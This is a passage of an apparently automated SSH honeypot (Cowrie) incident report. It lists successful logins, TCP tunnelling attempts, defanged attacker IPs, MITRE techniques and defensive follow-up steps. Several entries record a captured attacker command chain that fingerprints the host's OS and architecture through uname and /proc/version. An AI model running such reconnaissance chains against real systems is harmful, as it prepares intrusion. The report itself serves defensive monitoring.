| `2026-07-09 14:09:10` | `cowrie.direct-tcpip.data` |
| `2026-07-09 14:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc76e9519ceb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:11 |
| **Last Seen** | 2026-07-09 14:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:11:00` | `cowrie.session.connect` |
| `2026-07-09 14:11:00` | `cowrie.client.version` |
| `2026-07-09 14:11:00` | `cowrie.client.kex` |
| `2026-07-09 14:11:02` | `cowrie.login.success` |
| `2026-07-09 14:11:03` | `cowrie.session.params` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.success` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.command.input` |
| `2026-07-09 14:11:03` | `cowrie.log.closed` |
| `2026-07-09 14:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06878959db88

| Field | Detail |
|---|---|
| **Source IP** | `112.120.115[.]152` |
| **First Seen** | 2026-07-09 14:12 |
| **Last Seen** | 2026-07-09 14:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:12:17` | `cowrie.session.connect` |
| `2026-07-09 14:12:18` | `cowrie.client.version` |
| `2026-07-09 14:12:18` | `cowrie.client.kex` |
| `2026-07-09 14:12:21` | `cowrie.login.success` |
| `2026-07-09 14:12:22` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:12:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.115[.]152` to AbuseIPDB if not already reported
- [ ] Block `112.120.115[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5efe3eb286d1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:13 |
| **Last Seen** | 2026-07-09 14:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:13:05` | `cowrie.session.connect` |
| `2026-07-09 14:13:05` | `cowrie.client.version` |
| `2026-07-09 14:13:05` | `cowrie.client.kex` |
| `2026-07-09 14:13:07` | `cowrie.login.success` |
| `2026-07-09 14:13:09` | `cowrie.session.params` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.success` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.command.input` |
| `2026-07-09 14:13:09` | `cowrie.log.closed` |
| `2026-07-09 14:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee2503d0cda

| Field | Detail |
|---|---|
| **Source IP** | `223.99.212[.]58` |
| **First Seen** | 2026-07-09 14:14 |
| **Last Seen** | 2026-07-09 14:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:14:21` | `cowrie.session.connect` |
| `2026-07-09 14:14:21` | `cowrie.client.version` |
| `2026-07-09 14:14:21` | `cowrie.client.kex` |
| `2026-07-09 14:14:23` | `cowrie.login.success` |
| `2026-07-09 14:14:25` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.99.212[.]58` to AbuseIPDB if not already reported
- [ ] Block `223.99.212[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02db2a78f05

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]183` |
| **First Seen** | 2026-07-09 14:14 |
| **Last Seen** | 2026-07-09 14:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:14:36` | `cowrie.session.connect` |
| `2026-07-09 14:14:37` | `cowrie.client.version` |
| `2026-07-09 14:14:37` | `cowrie.client.kex` |
| `2026-07-09 14:14:37` | `cowrie.login.success` |
| `2026-07-09 14:14:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]183` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffdcf9f60d29

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:15 |
| **Last Seen** | 2026-07-09 14:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:15:15` | `cowrie.session.connect` |
| `2026-07-09 14:15:15` | `cowrie.client.version` |
| `2026-07-09 14:15:15` | `cowrie.client.kex` |
| `2026-07-09 14:15:16` | `cowrie.login.success` |
| `2026-07-09 14:15:18` | `cowrie.session.params` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.success` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:18` | `cowrie.command.input` |
| `2026-07-09 14:15:19` | `cowrie.log.closed` |
| `2026-07-09 14:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f77a5d3944b5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 14:16 |
| **Last Seen** | 2026-07-09 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:16:42` | `cowrie.session.connect` |
| `2026-07-09 14:16:42` | `cowrie.client.version` |
| `2026-07-09 14:16:42` | `cowrie.client.kex` |
| `2026-07-09 14:16:42` | `cowrie.login.success` |
| `2026-07-09 14:16:42` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:16:42` | `cowrie.direct-tcpip.data` |
| `2026-07-09 14:16:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122ba975cce0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:17 |
| **Last Seen** | 2026-07-09 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:17:26` | `cowrie.session.connect` |
| `2026-07-09 14:17:26` | `cowrie.client.version` |
| `2026-07-09 14:17:26` | `cowrie.client.kex` |
| `2026-07-09 14:17:28` | `cowrie.login.success` |
| `2026-07-09 14:17:30` | `cowrie.session.params` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.success` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.command.input` |
| `2026-07-09 14:17:30` | `cowrie.log.closed` |
| `2026-07-09 14:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1415a6ce149f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 14:19 |
| **Last Seen** | 2026-07-09 14:19 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:19:24` | `cowrie.session.connect` |
| `2026-07-09 14:19:25` | `cowrie.client.version` |
| `2026-07-09 14:19:25` | `cowrie.client.kex` |
| `2026-07-09 14:19:32` | `cowrie.login.success` |
| `2026-07-09 14:19:36` | `cowrie.session.params` |
| `2026-07-09 14:19:36` | `cowrie.command.input` |
| `2026-07-09 14:19:37` | `cowrie.log.closed` |
| `2026-07-09 14:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae1c1f23baa0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 14:19 |
| **Last Seen** | 2026-07-09 14:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:19:34` | `cowrie.session.connect` |
| `2026-07-09 14:19:34` | `cowrie.client.version` |
| `2026-07-09 14:19:34` | `cowrie.client.kex` |
| `2026-07-09 14:19:36` | `cowrie.login.success` |
| `2026-07-09 14:19:38` | `cowrie.session.params` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.success` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.command.input` |
| `2026-07-09 14:19:38` | `cowrie.log.closed` |
| `2026-07-09 14:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-305fef399f34

| Field | Detail |
|---|---|
| **Source IP** | `121.202.138[.]181` |
| **First Seen** | 2026-07-09 14:21 |
| **Last Seen** | 2026-07-09 14:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:21:49` | `cowrie.session.connect` |
| `2026-07-09 14:21:50` | `cowrie.client.version` |
| `2026-07-09 14:21:50` | `cowrie.client.kex` |
| `2026-07-09 14:21:52` | `cowrie.login.success` |
| `2026-07-09 14:21:53` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:21:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.138[.]181` to AbuseIPDB if not already reported
- [ ] Block `121.202.138[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895e3fabc850

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]6` |
| **First Seen** | 2026-07-09 14:21 |
| **Last Seen** | 2026-07-09 14:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:21:59` | `cowrie.session.connect` |
| `2026-07-09 14:21:59` | `cowrie.client.version` |
| `2026-07-09 14:21:59` | `cowrie.client.kex` |
| `2026-07-09 14:22:01` | `cowrie.login.success` |
| `2026-07-09 14:22:02` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75bba0ecc283

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 14:23 |
| **Last Seen** | 2026-07-09 14:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:23:15` | `cowrie.session.connect` |
| `2026-07-09 14:23:15` | `cowrie.client.version` |
| `2026-07-09 14:23:15` | `cowrie.client.kex` |
| `2026-07-09 14:23:16` | `cowrie.login.success` |
| `2026-07-09 14:23:16` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:23:16` | `cowrie.direct-tcpip.data` |
| `2026-07-09 14:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5eebb2e0947

| Field | Detail |
|---|---|
| **Source IP** | `101.13.0[.]53` |
| **First Seen** | 2026-07-09 14:25 |
| **Last Seen** | 2026-07-09 14:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:25:25` | `cowrie.session.connect` |
| `2026-07-09 14:25:26` | `cowrie.client.version` |
| `2026-07-09 14:25:26` | `cowrie.client.kex` |
| `2026-07-09 14:25:28` | `cowrie.login.success` |
| `2026-07-09 14:25:28` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:25:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.0[.]53` to AbuseIPDB if not already reported
- [ ] Block `101.13.0[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b67b6c61528

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-07-09 14:25 |
| **Last Seen** | 2026-07-09 14:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:25:38` | `cowrie.session.connect` |
| `2026-07-09 14:25:39` | `cowrie.client.version` |
| `2026-07-09 14:25:39` | `cowrie.client.kex` |
| `2026-07-09 14:25:41` | `cowrie.login.success` |
| `2026-07-09 14:25:42` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6869f8b0a98

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 14:27 |
| **Last Seen** | 2026-07-09 14:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:27:18` | `cowrie.session.connect` |
| `2026-07-09 14:27:18` | `cowrie.client.version` |
| `2026-07-09 14:27:18` | `cowrie.client.kex` |
| `2026-07-09 14:27:18` | `cowrie.login.success` |
| `2026-07-09 14:27:18` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:27:18` | `cowrie.direct-tcpip.data` |
| `2026-07-09 14:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36ddda0a46da

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 14:29 |
| **Last Seen** | 2026-07-09 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:29:15` | `cowrie.session.connect` |
| `2026-07-09 14:29:15` | `cowrie.client.version` |
| `2026-07-09 14:29:15` | `cowrie.client.kex` |
| `2026-07-09 14:29:15` | `cowrie.login.success` |
| `2026-07-09 14:29:16` | `cowrie.session.params` |
| `2026-07-09 14:29:16` | `cowrie.command.input` |
| `2026-07-09 14:29:16` | `cowrie.log.closed` |
| `2026-07-09 14:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d907e10395cb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 14:30 |
| **Last Seen** | 2026-07-09 14:30 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:30:43` | `cowrie.session.connect` |
| `2026-07-09 14:30:44` | `cowrie.client.version` |
| `2026-07-09 14:30:44` | `cowrie.client.kex` |
| `2026-07-09 14:30:51` | `cowrie.login.success` |
| `2026-07-09 14:30:54` | `cowrie.session.params` |
| `2026-07-09 14:30:54` | `cowrie.command.input` |
| `2026-07-09 14:30:55` | `cowrie.log.closed` |
| `2026-07-09 14:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fce54de1324

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-07-09 14:38 |
| **Last Seen** | 2026-07-09 14:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:38:05` | `cowrie.session.connect` |
| `2026-07-09 14:38:06` | `cowrie.client.version` |
| `2026-07-09 14:38:06` | `cowrie.client.kex` |
| `2026-07-09 14:38:07` | `cowrie.login.success` |
| `2026-07-09 14:38:07` | `cowrie.direct-tcpip.request` |
| `2026-07-09 14:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2f537cc3e0

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
| **First Seen** | 2026-07-09 14:40 |
| **Last Seen** | 2026-07-09 14:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 14:40:21` | `cowrie.session.connect` |
